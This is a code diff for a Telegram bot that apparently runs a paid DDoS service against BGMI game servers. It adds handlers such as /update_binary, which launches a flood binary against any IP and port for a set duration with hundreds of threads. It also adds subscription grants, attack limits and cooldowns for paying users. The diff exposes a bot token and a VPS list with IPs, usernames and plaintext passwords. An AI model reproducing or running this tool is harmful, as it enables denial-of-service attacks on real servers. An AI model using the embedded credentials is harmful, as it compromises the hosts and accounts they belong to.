@@ -19,8 +19,8 @@ logging.basicConfig(level=logging.INFO)
 MAX_ATTACK_DURATION = 240
 USER_ACCESS_FILE = "user_access.txt"
 ATTACK_LOG_FILE = "attack_log.txt"
-OWNER_ID = "6442837812"
-bot = telebot.TeleBot('7507720145:AAGQ2ZQ3l60UAoKKIIKcUA7fZQuod-w5rhA')
+OWNER_ID = "6598149418"
+bot = telebot.TeleBot('8018452264:AAFp8lsBlZ7GI8rdKNzGeQcqIfUhgyitMXo')
 
 vps_list = [
     {"ip": "65.20.70.198", "user": "master_mbnctmgpjj", "pass": "jssZ92MddczG"},
@@ -486,7 +486,279 @@ def handle_bgmi(message):
     )
     ask_attack_feedback(caller_id, message.chat.id)
 
-# ... (all other handlers: update_binary, when, help, grant, revoke, attack_limit, list_users, backup, download_backup, set_cooldown, status remain exactly the same as previous full version)
+@bot.message_handler(commands=['update_binary'])
+def update_binary_command(message):
+    if not is_authorized(message):
+        bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
+        return
+    caller_id = str(message.from_user.id)
+    if caller_id != OWNER_ID:
+        bot.reply_to(message, "❌ Only the owner can use the /update_binary command.")
+        return
+    command = message.text.split()
+    if len(command) not in [4, 5]:
+        bot.reply_to(message, "Invalid format! Use: `/update_binary <target> <port> <duration> [threads]`", parse_mode='Markdown')
+        return
+    target = command[1]
+    port = command[2]
+    if not port.isdigit() or not (1 <= int(port) <= 65535):
+        bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
+        return
+    if not is_valid_ip(target):
+        bot.reply_to(message, "❌ Invalid target IP! Please provide a valid IP address.")
+        return
+    try:
+        duration = int(command[3])
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid duration! Please provide a valid number.")
+        return
+    threads = "900"
+    if len(command) == 5:
+        threads = command[4]
+        if not threads.isdigit():
+            bot.reply_to(message, "❌ Invalid threads count! Please provide a valid number.")
+            return
+    current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
+    if len(current_active) >= 1:
+        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
+        return
+    upload_new_binary()
+    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
+    attack_info = {'user_id': caller_id, 'target': target, 'port': port, 'end_time': attack_end_time}
+    try:
+        proc = subprocess.Popen(["./soul", target, port, str(duration), threads],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        attack_info["proc"] = proc
+    except Exception as e:
+        logging.error(f"Subprocess error: {e}")
+        bot.reply_to(message, "🚨 An error occurred while executing the updated binary command.")
+        return
+    with attacks_lock:
+        active_attacks.append(attack_info)
+    save_active_attacks()
+    log_attack(caller_id, target, port, duration)
+    msg = bot.send_message(
+        message.chat.id,
+        f"""
+⚡️🔥 UPDATED BINARY ATTACK DEPLOYED 🔥⚡️
+
+👑 Commander: `{caller_id}`
+🎯 Target Locked: `{target}`
+📡 Port Engaged: `{port}`
+⏳ Time Remaining: `{duration} seconds`
+⚔️ Weapon: `BGMI Protocol (Updated Binary)`
+🔥 The new binary is now live and attacking! 🔥
+        """,
+        parse_mode='Markdown'
+    )
+    attack_info['message_id'] = msg.message_id
+    save_active_attacks()
+    asyncio.run_coroutine_threadsafe(
+        async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, caller_id, target, port, attack_info),
+        async_loop
+    )
+
+@bot.message_handler(commands=['when'])
+def when_command(message):
+    global active_attacks
+    active_attacks = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
+    if not active_attacks:
+        reply = bot.reply_to(message, "No attacks are currently in progress.")
+        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+        return
+    active_attack_message = "Current active attacks:\n"
+    for attack in active_attacks:
+        target = attack['target']
+        port = attack['port']
+        time_remaining = max((attack['end_time'] - datetime.datetime.now()).total_seconds(), 0)
+        active_attack_message += f"🌐 Target: `{target}`, 📡 Port: `{port}`, ⏳ Remaining Time: {int(time_remaining)} seconds\n"
+    reply = bot.reply_to(message, active_attack_message)
+    Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+
+@bot.message_handler(commands=['help'])
+def help_command(message):
+    help_text = """
+🚀 Available Commands:
+- /start - Get started with a welcome message!
+- /help - Discover all the available commands.
+- /bgmi &lt;target&gt; &lt;port&gt; &lt;duration&gt; - Launch an attack.
+- /update_binary &lt;target&gt; &lt;port&gt; &lt;duration&gt; [threads] - Recompile and launch a new binary instantly. (Owner only)
+- /deploy - Deploy Clodways repo to all VPS (Owner only)
+- /stop_all - Stop all running attacks. (Owner only)
+- /when - Check the remaining time for current attacks.
+- /grant &lt;user_id&gt; &lt;duration&gt; - Grant access.
+- /revoke &lt;user_id&gt; - Revoke access.
+- /attack_limit &lt;user_id&gt; &lt;max_duration&gt; - Set max attack duration (Owner only).
+- /status - Check your subscription status.
+- /list_users - List all users with access (Owner only).
+- /backup - Backup user access data (Owner only).
+- /download_backup - Download user data (Owner only).
+- /set_cooldown &lt;user_id&gt; &lt;minutes&gt; - Set a user's cooldown time (Owner only).
+
+Usage Notes:
+- Replace &lt;user_id&gt;, &lt;target&gt;, &lt;port&gt;, &lt;duration&gt;, and [threads] with appropriate values.
+- For assistance, contact the owner.
+    """
+    try:
+        bot.reply_to(message, help_text, parse_mode='HTML')
+    except telebot.apihelper.ApiTelegramException as e:
+        logging.error(f"Telegram API error: {e}")
+        bot.reply_to(message, "🚨 An error occurred while processing your request. Please try again later.")
+
+@bot.message_handler(commands=['grant'])
+def grant_command(message):
+    caller = str(message.from_user.id)
+    if caller != OWNER_ID:
+        reply = bot.reply_to(message, "❌ You are not authorized to use this command.")
+        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+        return
+    command = message.text.split()
+    if len(command) != 3:
+        reply = bot.reply_to(message, "Invalid format! Use: `/grant <user_id> <duration>`")
+        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+        return
+    target_user = command[1]
+    duration_str = command[2].lower()
+    try:
+        if duration_str.endswith("h"):
+            hours = int(duration_str[:-1])
+            delta = datetime.timedelta(hours=hours)
+        elif duration_str.endswith("d"):
+            days = int(duration_str[:-1])
+            delta = datetime.timedelta(days=days)
+        elif duration_str.isdigit():
+            days = int(duration_str)
+            delta = datetime.timedelta(days=days)
+        else:
+            reply = bot.reply_to(message, "Invalid duration format! Use a number followed by 'd' for days or 'h' for hours.")
+            Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+            return
+    except ValueError:
+        reply = bot.reply_to(message, "Invalid duration value!")
+        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+        return
+    expiration_date = datetime.datetime.now() + delta
+    user_access[target_user] = expiration_date
+    save_user_access()
+    reply = bot.reply_to(message, f"✅ Access granted until {expiration_date.strftime('%Y-%m-%d %H:%M:%S')} for ID: {target_user}.")
+    Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+
+@bot.message_handler(commands=['revoke'])
+def revoke_command(message):
+    caller = str(message.from_user.id)
+    if caller != OWNER_ID:
+        reply = bot.reply_to(message, "❌ You are not authorized to use this command.")
+        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+        return
+    command = message.text.split()
+    if len(command) != 2:
+        reply = bot.reply_to(message, "Invalid format! Use: `/revoke <user_id>`")
+        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+        return
+    target_user = command[1]
+    if target_user in user_access:
+        del user_access[target_user]
+        save_user_access()
+        reply = bot.reply_to(message, f"✅ Access revoked for {target_user}.")
+        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+    else:
+        reply = bot.reply_to(message, f"❌ ID {target_user} does not have access.")
+        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
+
+@bot.message_handler(commands=['attack_limit'])
+def attack_limit_command(message):
+    caller = str(message.from_user.id)
+    if caller != OWNER_ID:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+    command = message.text.split()
+    if len(command) != 3 or not command[2].isdigit():
+        bot.reply_to(message, "Invalid format! Use: `/attack_limit <user_id> <max_duration>`")
+        return
+    target_user, max_duration = command[1], int(command[2])
+    attack_limits[target_user] = max_duration
+    save_persistent_data()
+    bot.reply_to(message, f"✅ Attack limit set to {max_duration} seconds for {target_user}.")
+
+@bot.message_handler(commands=['list_users'])
+def list_users_command(message):
+    caller = str(message.from_user.id)
+    if caller != OWNER_ID:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+    now = datetime.datetime.now()
+    lines = []
+    for uid, exp in user_access.items():
+        delta = exp - now
+        total_seconds = delta.total_seconds()
+        if total_seconds < 0:
+            continue
+        days = delta.days
+        hours, remainder = divmod(delta.seconds, 3600)
+        minutes, _ = divmod(remainder, 60)
+        try:
+            chat_info = bot.get_chat(uid)
+            name = chat_info.first_name if chat_info.first_name else uid
+        except Exception:
+            name = uid
+        if days > 0:
+            line = f"{name} (ID: {uid}) - {days} day(s) {hours} hour(s) {minutes} minute(s) left"
+        else:
+            line = f"{name} (ID: {uid}) - {hours} hour(s) {minutes} minute(s) left"
+        lines.append(line)
+    reply_text = "Users:\n" + "\n".join(lines)
+    bot.reply_to(message, reply_text)
+
+@bot.message_handler(commands=['backup'])
+def backup_command(message):
+    if str(message.from_user.id) != OWNER_ID:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+    with open("user_access_backup.txt", "w") as backup_file:
+        for uid, exp in user_access.items():
+            try:
+                chat_info = bot.get_chat(uid)
+                name = chat_info.first_name if chat_info.first_name else uid
+            except Exception as e:
+                logging.error(f"Error retrieving info for {uid}: {e}")
+                name = uid
+            backup_file.write(f"{uid},{name},{exp.isoformat()}\n")
+    bot.reply_to(message, "✅ User access data has been backed up.")
+
+@bot.message_handler(commands=['download_backup'])
+def download_backup(message):
+    if str(message.from_user.id) != OWNER_ID:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+    with open("user_access_backup.txt", "rb") as backup_file:
+        bot.send_document(message.chat.id, backup_file)
+
+@bot.message_handler(commands=['set_cooldown'])
+def set_cooldown_command(message):
+    if str(message.from_user.id) != OWNER_ID:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+    command = message.text.split()
+    if len(command) != 3 or not command[2].isdigit():
+        bot.reply_to(message, "Invalid format! Use: `/set_cooldown <user_id> <minutes>`", parse_mode='Markdown')
+        return
+    target_user_id = command[1]
+    new_cooldown_minutes = int(command[2])
+    if new_cooldown_minutes < 1:
+        new_cooldown_minutes = 1
+    new_cooldown_seconds = new_cooldown_minutes * 60
+    user_cooldowns[target_user_id] = new_cooldown_seconds
+    save_persistent_data()
+    bot.reply_to(message, f"✅ Cooldown for {target_user_id} set to {new_cooldown_minutes} minute(s).")
+
+@bot.message_handler(commands=['status'])
+def status_command(message):
+    user_id = str(message.from_user.id)
+    if user_id in user_access:
+        expiration = user_access[user_id]
+        bot.reply_to(message, f"✅ Your access is valid until {expiration.strftime('%Y-%m-%d %H:%M:%S')}.")
+    else:
+        bot.reply_to(message, "❌ You do not have access. Contact the owner.")
 
 while True:
     try:
